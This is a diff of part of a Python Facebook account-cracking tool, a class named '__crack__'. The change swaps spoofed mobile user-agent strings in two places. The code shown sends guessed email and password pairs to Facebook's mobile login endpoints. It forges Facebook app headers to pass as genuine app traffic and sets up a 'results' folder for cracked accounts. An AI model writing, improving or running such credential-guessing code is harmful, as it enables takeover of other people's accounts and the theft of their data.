@@ -719,7 +719,7 @@ class __crack__:
             pw = pw.lower()
             try: os.mkdir('results')
             except: pass
-	    ua_mb = random.choice(['Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36'])
+	    ua_mb = random.choice(['Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12'])
             headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyLTE', 'user-agent': ua_mb, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
             aw = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'}, headers=headers_)
             xo = aw.content
@@ -756,7 +756,7 @@ class __crack__:
             pw = pw.lower()
             try: os.mkdir('results')
             except: pass
-	    ua_mobile = random.choice(['Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501'])
+	    ua_mobile = random.choice(['Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12'])
             headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyLTE', 'user-agent': ua_mobile, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
             ses = requests.Session()
             ses.get('https://m.facebook.com/')
